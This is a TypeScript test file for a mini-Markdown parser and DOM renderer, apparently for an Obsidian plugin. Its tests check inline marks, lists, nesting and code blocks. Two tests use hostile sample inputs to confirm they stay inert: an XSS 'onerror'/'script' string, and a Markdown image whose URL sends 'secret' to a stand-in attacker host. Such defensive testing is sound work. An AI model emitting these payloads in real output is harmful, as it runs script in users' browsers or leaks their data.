import assert from 'node:assert/strict';
import { test } from 'node:test';
import { parseInline, parseMiniMarkdown, renderMiniMarkdown } from '../src/ui/miniMarkdown.ts';

/* The few DOM calls the renderer makes, recorded as a tree. It has no HTML
   parser on purpose: if the renderer ever reached for innerHTML, these tests
   would see nothing rendered. */
class FakeNode {
  parentNode: FakeNode | null = null;
  children: FakeNode[] = [];
  className = '';
  attributes: Record<string, string> = {};
  readonly tag: string;
  readonly text: string;
  readonly ownerDocument: FakeDocument;

  constructor(doc: FakeDocument, tag: string, text = '') {
    this.ownerDocument = doc;
    this.tag = tag;
    this.text = text;
  }

  appendChild(child: FakeNode): FakeNode {
    child.parentNode = this;
    this.children.push(child);
    return child;
  }

  removeChild(child: FakeNode): FakeNode {
    this.children = this.children.filter((c) => c !== child);
    child.parentNode = null;
    return child;
  }

  replaceChildren(...next: FakeNode[]): void {
    for (const c of this.children) c.parentNode = null;
    this.children = [];
    for (const c of next) this.appendChild(c);
  }

  setAttribute(name: string, value: string): void {
    this.attributes[name] = value;
  }

  /* Obsidian's helpers, as Obsidian has them: made in this node's document, then appended to it. */
  createEl(tag: string, o?: { cls?: string; text?: string; attr?: Record<string, string> } | string): FakeNode {
    const info = typeof o === 'string' ? { cls: o } : (o ?? {});
    const el = this.ownerDocument.createElement(tag);
    if (info.cls) el.className = info.cls;
    if (info.text) el.appendChild(this.ownerDocument.createTextNode(info.text));
    for (const [name, value] of Object.entries(info.attr ?? {})) el.setAttribute(name, value);
    return this.appendChild(el);
  }

  createDiv(o?: Parameters<FakeNode['createEl']>[1]): FakeNode {
    return this.createEl('div', o);
  }

  /** A compact picture of the subtree: `ul(li("a"),li(strong("b")))`. */
  shape(): string {
    if (this.tag === '#text') return JSON.stringify(this.text);
    return `${this.tag}(${this.children.map((c) => c.shape()).join(',')})`;
  }
}

class FakeDocument {
  createElement(tag: string): FakeNode {
    return new FakeNode(this, tag);
  }
  createTextNode(text: string): FakeNode {
    return new FakeNode(this, '#text', text);
  }
}

function render(markdown: string): { host: FakeNode; cleanup: () => void } {
  const host = new FakeDocument().createElement('div');
  const cleanup = renderMiniMarkdown(markdown, host as unknown as HTMLElement);
  return { host, cleanup };
}

test('inline: bold, italic and code', () => {
  assert.deepEqual(parseInline('a **b** *c* `d`'), [
    { type: 'text', text: 'a ' },
    { type: 'strong', children: [{ type: 'text', text: 'b' }] },
    { type: 'text', text: ' ' },
    { type: 'em', children: [{ type: 'text', text: 'c' }] },
    { type: 'text', text: ' ' },
    { type: 'code', text: 'd' },
  ]);
});

test('inline: the enhanced-bullet shape, in French', () => {
  assert.deepEqual(parseInline('**Budget :** deux postes gelés'), [
    { type: 'strong', children: [{ type: 'text', text: 'Budget :' }] },
    { type: 'text', text: ' deux postes gelés' },
  ]);
});

test('inline: emphasis nests in both directions', () => {
  assert.deepEqual(parseInline('**a *b* c**'), [
    {
      type: 'strong',
      children: [
        { type: 'text', text: 'a ' },
        { type: 'em', children: [{ type: 'text', text: 'b' }] },
        { type: 'text', text: ' c' },
      ],
    },
  ]);
  assert.deepEqual(parseInline('*a **b** c*'), [
    {
      type: 'em',
      children: [
        { type: 'text', text: 'a ' },
        { type: 'strong', children: [{ type: 'text', text: 'b' }] },
        { type: 'text', text: ' c' },
      ],
    },
  ]);
});

test('inline: an unclosed mark stays as typed (a bullet still streaming)', () => {
  assert.deepEqual(parseInline('**Topi'), [{ type: 'text', text: '**Topi' }]);
  assert.deepEqual(parseInline('half *done'), [{ type: 'text', text: 'half *done' }]);
  assert.deepEqual(parseInline('a `b'), [{ type: 'text', text: 'a `b' }]);
});

test('inline: stars that are not emphasis are left alone', () => {
  assert.deepEqual(parseInline('2 * 3 * 4'), [{ type: 'text', text: '2 * 3 * 4' }]);
  assert.deepEqual(parseInline('****'), [{ type: 'text', text: '****' }]);
});

test('inline: code keeps its stars', () => {
  assert.deepEqual(parseInline('run `a **b** c` now'), [
    { type: 'text', text: 'run ' },
    { type: 'code', text: 'a **b** c' },
    { type: 'text', text: ' now' },
  ]);
  assert.deepEqual(parseInline('**see `x**y` here**'), [
    {
      type: 'strong',
      children: [
        { type: 'text', text: 'see ' },
        { type: 'code', text: 'x**y' },
        { type: 'text', text: ' here' },
      ],
    },
  ]);
});

test('blocks: paragraphs are split on blank lines and joined across soft breaks', () => {
  assert.deepEqual(parseMiniMarkdown('one\ntwo\n\nthree'), [
    { type: 'paragraph', children: [{ type: 'text', text: 'one two' }] },
    { type: 'paragraph', children: [{ type: 'text', text: 'three' }] },
  ]);
  assert.deepEqual(parseMiniMarkdown(''), []);
  assert.deepEqual(parseMiniMarkdown('\n\n  \n'), []);
});

test('blocks: headings of level 3 and 4', () => {
  assert.deepEqual(parseMiniMarkdown('### Decisions\n#### Risks ##'), [
    { type: 'heading', level: 3, children: [{ type: 'text', text: 'Decisions' }] },
    { type: 'heading', level: 4, children: [{ type: 'text', text: 'Risks' }] },
  ]);
  /* No space after the marks: a hashtag, not a heading. */
  assert.deepEqual(parseMiniMarkdown('#tag'), [{ type: 'paragraph', children: [{ type: 'text', text: '#tag' }] }]);
});

test('blocks: dash, star and numbered lists', () => {
  const blocks = parseMiniMarkdown('- a\n* b\n\n3. c\n4) d');
  assert.deepEqual(blocks, [
    {
      type: 'list',
      ordered: false,
      start: 1,
      items: [[{ type: 'text', text: 'a' }], [{ type: 'text', text: 'b' }]],
    },
    {
      type: 'list',
      ordered: true,
      start: 3,
      items: [[{ type: 'text', text: 'c' }], [{ type: 'text', text: 'd' }]],
    },
  ]);
});

test('blocks: a list starts right after a paragraph, and changes kind without a blank line', () => {
  const blocks = parseMiniMarkdown('Next steps:\n- one\n1. two');
  assert.deepEqual(
    blocks.map((b) => b.type + (b.type === 'list' ? (b.ordered ? ':ol' : ':ul') : '')),
    ['paragraph', 'list:ul', 'list:ol'],
  );
});

test('blocks: an indented line continues the list item above it', () => {
  assert.deepEqual(parseMiniMarkdown('- **Topic:** first\n  second line'), [
    {
      type: 'list',
      ordered: false,
      start: 1,
      items: [
        [
          { type: 'strong', children: [{ type: 'text', text: 'Topic:' }] },
          { type: 'text', text: ' first second line' },
        ],
      ],
    },
  ]);
});

test('blocks: Windows line endings', () => {
  assert.deepEqual(parseMiniMarkdown('a\r\n\r\n- b\r\n'), [
    { type: 'paragraph', children: [{ type: 'text', text: 'a' }] },
    { type: 'list', ordered: false, start: 1, items: [[{ type: 'text', text: 'b' }]] },
  ]);
});

test('render: wraps the output in div.mh-md', () => {
  const { host } = render('Hello **there**\n\n- one\n- `two`');
  assert.equal(host.children.length, 1);
  const root = host.children[0] as FakeNode;
  assert.equal(root.tag, 'div');
  assert.equal(root.className, 'mh-md');
  assert.equal(root.shape(), 'div(p("Hello ",strong("there")),ul(li("one"),li(code("two"))))');
});

test('render: headings and a numbered list that does not start at 1', () => {
  const { host } = render('### Title\n#### Sub\n2. b\n3. c');
  const root = host.children[0] as FakeNode;
  assert.equal(root.shape(), 'div(h3("Title"),h4("Sub"),ol(li("b"),li("c")))');
  assert.equal((root.children[2] as FakeNode).attributes.start, '2');
});

test('render: markup in the text stays text', () => {
  const { host } = render('<img src=x onerror=alert(1)> and <script>alert(2)</script>');
  const root = host.children[0] as FakeNode;
  assert.equal(root.shape(), 'div(p("<img src=x onerror=alert(1)> and <script>alert(2)</script>"))');
});

test('render: replaces what was in the element, and the cleanup removes only its own output', () => {
  const doc = new FakeDocument();
  const host = doc.createElement('div');
  host.appendChild(doc.createTextNode('stale'));

  const first = renderMiniMarkdown('one', host as unknown as HTMLElement);
  assert.equal(host.shape(), 'div(div(p("one")))');

  const second = renderMiniMarkdown('two', host as unknown as HTMLElement);
  assert.equal(host.shape(), 'div(div(p("two")))');

  /* A late cleanup from the earlier render must not take the newer output with it. */
  first();
  assert.equal(host.shape(), 'div(div(p("two")))');

  second();
  assert.equal(host.shape(), 'div()');
});

test('render: empty input renders an empty wrapper', () => {
  const { host } = render('');
  assert.equal(host.shape(), 'div(div())');
});

test('blocks: a # that belongs to the last word of a heading is kept', () => {
  /* Only a run of # set off by a space closes a heading. */
  assert.deepEqual(parseMiniMarkdown('### Learn C#'), [
    { type: 'heading', level: 3, children: [{ type: 'text', text: 'Learn C#' }] },
  ]);
  assert.deepEqual(parseMiniMarkdown('#### Ticket #12 moved to F#  '), [
    { type: 'heading', level: 4, children: [{ type: 'text', text: 'Ticket #12 moved to F#' }] },
  ]);
  assert.deepEqual(parseMiniMarkdown('### C# ###'), [
    { type: 'heading', level: 3, children: [{ type: 'text', text: 'C#' }] },
  ]);
});

test('blocks: a line of text right after a list item stays in that item, a blank line ends it', () => {
  assert.deepEqual(parseMiniMarkdown('- a\r\nsuite\r\n\r\nfin'), [
    { type: 'list', ordered: false, start: 1, items: [[{ type: 'text', text: 'a suite' }]] },
    { type: 'paragraph', children: [{ type: 'text', text: 'fin' }] },
  ]);
});

test('blocks: a bullet with nothing after the marker is an empty item, a bare dash is text', () => {
  assert.deepEqual(parseMiniMarkdown('- '), [{ type: 'list', ordered: false, start: 1, items: [[]] }]);
  assert.deepEqual(parseMiniMarkdown('-'), [{ type: 'paragraph', children: [{ type: 'text', text: '-' }] }]);
  /* Bold at the start of a line is not a star bullet. */
  assert.deepEqual(parseMiniMarkdown('**Budget :** gelé'), [
    {
      type: 'paragraph',
      children: [
        { type: 'strong', children: [{ type: 'text', text: 'Budget :' }] },
        { type: 'text', text: ' gelé' },
      ],
    },
  ]);
});

test('inline: accents, emoji and other characters outside the BMP survive whole', () => {
  assert.deepEqual(parseInline('**Équipe réseau :** *là-dessus* `ça` 👍🏽 œuvre'), [
    { type: 'strong', children: [{ type: 'text', text: 'Équipe réseau :' }] },
    { type: 'text', text: ' ' },
    { type: 'em', children: [{ type: 'text', text: 'là-dessus' }] },
    { type: 'text', text: ' ' },
    { type: 'code', text: 'ça' },
    { type: 'text', text: ' 👍🏽 œuvre' },
  ]);
  const { host } = render('- **😀 ok** 𝒳');
  assert.equal((host.children[0] as FakeNode).shape(), 'div(ul(li(strong("😀 ok")," 𝒳")))');
});

test('inline: a long answer full of stray stars is parsed without stalling', () => {
  /* Each unclosed star scans the rest of the text, which is quadratic. At
     several times the size of a real answer that must still be instant. */
  const text = 'note * and *again '.repeat(600);
  const started = performance.now();
  const nodes = parseInline(text);
  assert.ok(performance.now() - started < 1000);
  assert.equal(
    nodes.map((n) => (n.type === 'text' ? n.text : '')).join('').length > 0,
    true,
  );
});

test('nested bullets keep their depth, flat lists keep their shape', () => {
  const [flat] = parseMiniMarkdown('- a\n- b');
  assert.ok(flat && flat.type === 'list' && flat.depths === undefined);
  const [nested] = parseMiniMarkdown('- a\n  - b\n    - c\n\t- d\n- e');
  assert.ok(nested && nested.type === 'list');
  assert.deepEqual(nested.depths, [0, 1, 2, 1, 0]);
  assert.equal(nested.items.length, 5);
});

test('a numbered item nested under a bullet stays in the same list', () => {
  const blocks = parseMiniMarkdown('- a\n  1. b\n- c');
  assert.equal(blocks.length, 1);
  const [list] = blocks;
  assert.ok(list && list.type === 'list');
  /* What each item was written with: the renderer needs it to draw the nested list as numbered. */
  assert.deepEqual(list.marks, [null, 1, null]);
  /* A flat list says nothing of it: every item is of the list's own kind. */
  const [flat] = parseMiniMarkdown('1. a\n2. b');
  assert.ok(flat && flat.type === 'list' && flat.marks === undefined);
});

test('render: nested items go inside the item they hang under', () => {
  const shape = (md: string): string => (render(md).host.children[0] as FakeNode).shape();
  assert.equal(shape('- a\n  - b\n    - c\n  - d\n- e'), 'div(ul(li("a",ul(li("b",ul(li("c"))),li("d"))),li("e")))');
  /* Back up two levels at once. */
  assert.equal(shape('- a\n  - b\n    - c\n- d'), 'div(ul(li("a",ul(li("b",ul(li("c"))))),li("d")))');
  /* Inline marks inside a nested item. */
  assert.equal(shape('- a\n  - **b** `c`'), 'div(ul(li("a",ul(li(strong("b")," ",code("c"))))))');
});

test('render: a bullet nested in a numbered list does not take a number from it', () => {
  /* Drawn as one more item of the numbered list, the nested bullet was counted: the model's
     "2." came out as "3.". Inside the first item, the browser counts two items and shows 1 and 2. */
  const { host } = render('1. Vendor renewal\n   - may slip to November\n2. Network window');
  const root = host.children[0] as FakeNode;
  assert.equal(root.shape(), 'div(ol(li("Vendor renewal",ul(li("may slip to November"))),li("Network window")))');
  const list = root.children[0] as FakeNode;
  assert.equal(list.children.filter((child) => child.tag === 'li').length, 2);
});

test('render: a numbered list nested under a bullet keeps its numbers', () => {
  const { host } = render('- Plan\n  1. first step\n  2. second step\n- Budget\n  3. third\n  4. fourth');
  const root = host.children[0] as FakeNode;
  assert.equal(
    root.shape(),
    'div(ul(li("Plan",ol(li("first step"),li("second step"))),li("Budget",ol(li("third"),li("fourth")))))',
  );
  const [plan, budget] = (root.children[0] as FakeNode).children as [FakeNode, FakeNode];
  /* Each nested list starts at the number its first item was written with. */
  assert.equal((plan.children[1] as FakeNode).attributes.start, undefined);
  assert.equal((budget.children[1] as FakeNode).attributes.start, '3');
});

test('render: the kind of a nested list can change, and an item is never deeper than one level under the last', () => {
  const shape = (md: string): string => (render(md).host.children[0] as FakeNode).shape();
  /* Bullets, then numbers, at the same nested level: two lists under the one item. */
  assert.equal(shape('- a\n  - b\n  1. c\n  2. d'), 'div(ul(li("a",ul(li("b")),ol(li("c"),li("d")))))');
  /* Indented four levels under a top item: one level down is all there is to hang under. */
  assert.equal(shape('- a\n        - b\n- c'), 'div(ul(li("a",ul(li("b"))),li("c")))');
  /* A list that starts indented starts at the top all the same. */
  assert.equal(shape('  - a\n    - b\n- c'), 'div(ul(li("a",ul(li("b"))),li("c")))');
  /* A flat list is drawn as before. */
  assert.equal(shape('- a\n- b'), 'div(ul(li("a"),li("b")))');
});

test('a code block is kept as text: a "# line" in it is no heading', () => {
  const blocks = parseMiniMarkdown('Before\n\n```js\n# not a heading\n- not a list\n```\n\nAfter');
  assert.deepEqual(
    blocks.map((b) => b.type),
    ['paragraph', 'code', 'paragraph'],
  );
  const code = blocks[1];
  assert.ok(code && code.type === 'code');
  assert.equal(code.text, '# not a heading\n- not a list');
});

test('a code block still streaming shows what has arrived', () => {
  const blocks = parseMiniMarkdown('```\nline one');
  assert.deepEqual(blocks, [{ type: 'code', text: 'line one' }]);
});

test('links, images and wikilinks are shown as their text', () => {
  type Inline = ReturnType<typeof parseInline>[number];
  const flat = (nodes: Inline[]): string =>
    nodes.map((n) => (n.type === 'text' || n.type === 'code' ? n.text : flat(n.children))).join('');
  const text = (md: string): string => flat(parseInline(md));
  assert.equal(text('see [the plan](https://example.com/plan) now'), 'see the plan now');
  assert.equal(text('![chart](https://attacker.example/p.png?d=secret)'), 'chart');
  assert.equal(text('[](https://example.com)'), 'https://example.com');
  assert.equal(text('with [[Jane Example|Jane]] and [[CPR]]'), 'with Jane and CPR');
  assert.equal(text('a [bracket] stays'), 'a [bracket] stays');
  assert.equal(text('**[bold link](x)** ok'), 'bold link ok');
});
